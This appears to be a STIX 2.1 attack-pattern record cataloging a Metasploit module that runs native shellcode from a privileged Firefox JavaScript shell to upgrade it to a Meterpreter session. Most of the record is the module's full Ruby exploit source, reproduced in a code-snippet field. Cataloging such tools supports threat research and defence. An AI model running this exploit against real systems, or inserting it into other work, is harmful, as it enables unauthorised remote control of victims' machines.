{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ca37649c-5ac6-43b3-bad8-afa815d5f5f4",
    "created": "2024-08-14T16:56:44.758108Z",
    "modified": "2024-08-14T16:56:44.758112Z",
    "name": "Firefox Exec Shellcode from Privileged Javascript Shell",
    "description": " This module allows execution of native payloads from a privileged Firefox Javascript shell. It places the specified payload into memory, adds the necessary protection flags and calls it, which can be useful for upgrading a Firefox javascript shell to a Meterpreter session without touching the disk.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/firefox/local/exec_shellcode.rb",
            "external_id": "exec_shellcode.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking # Missing autodetection, but has widespread targetability\n\n  include Msf::Payload::Firefox\n  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'          => 'Firefox Exec Shellcode from Privileged Javascript Shell',\n      'Description'   => %q{\n        This module allows execution of native payloads from a privileged Firefox Javascript shell.\n        It places the specified payload into memory, adds the necessary protection flags,\n        and calls it, which can be useful for upgrading a Firefox javascript shell to a Meterpreter\n        session without touching the disk.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [ 'joev' ],\n      'Platform'      => [ 'firefox' ],\n      'DisclosureDate' => '2014-03-10',\n      'Targets'       => [\n        [\n          'Native Payload', {\n            'Platform' => %w{ linux osx win unix },\n            'Arch'     => ARCH_ALL\n          }\n        ]\n      ],\n      'DefaultTarget' => 0\n    ))\n\n    register_options([\n      OptInt.new('TIMEOUT', [true, \"Maximum time (seconds) to wait for a response\", 90])\n    ])\n  end\n\n  def exploit\n    print_status \"Running the Javascript shell...\"\n    session.shell_write(\"[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]\")\n    results = session.shell_read_until_token(\"[!JAVASCRIPT]\", 0, datastore['TIMEOUT'])\n    print_warning(results) if results.present?\n  end\n\n  def js_payload\n    %Q|\n      (function(send){\n        try {\n          #{run_payload}\n          send(\"Payload executed.\");\n        } catch (e) {\n          send(e);\n        }\n      })(send);\n    |.strip\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-03-10",
    "x_mitre_platforms": [
        "%w{ linux osx win unix }"
    ]
}